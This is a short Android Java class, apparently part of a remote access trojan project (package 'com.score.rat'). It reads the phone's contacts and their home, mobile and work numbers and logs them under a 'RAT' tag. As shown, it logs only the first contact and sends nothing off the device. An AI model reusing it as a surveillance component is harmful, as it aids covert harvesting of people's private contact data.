package com.score.rat.Library;

import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds;
import android.util.Log;

import com.score.rat.MainActivity;

public class ContactLister {
    public static boolean listContacts(MainActivity m){
        boolean ret = true;
        Cursor c = m.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,
                null,null,null,null);
        if(c.moveToFirst()){
            String id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID));

            String name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
            Log.d("RAT","Name: " + name);
            Cursor p = m.getContentResolver().query(CommonDataKinds.Phone.CONTENT_URI, null,
                    CommonDataKinds.Phone.CONTACT_ID+ " = " + id, null,null);
            while(p.moveToNext()){
                String number = p.getString(p.getColumnIndex(CommonDataKinds.Phone.NUMBER));
                int type = p.getInt(p.getColumnIndex(CommonDataKinds.Phone.TYPE));
                switch(type){
                    case CommonDataKinds.Phone.TYPE_HOME:
                        Log.d("RAT", "Home: " + number);
                        break;
                    case CommonDataKinds.Phone.TYPE_MOBILE:
                        Log.d("RAT", "Mobile: " + number);
                        break;
                    case CommonDataKinds.Phone.TYPE_WORK:
                        Log.d("RAT", "Work: " + number);
                        break;
                    default:
                        Log.d("RAT", "Other: " + number);
                        break;
                }
            }
            p.close();
        }
        c.close();

        return ret;
    }
}
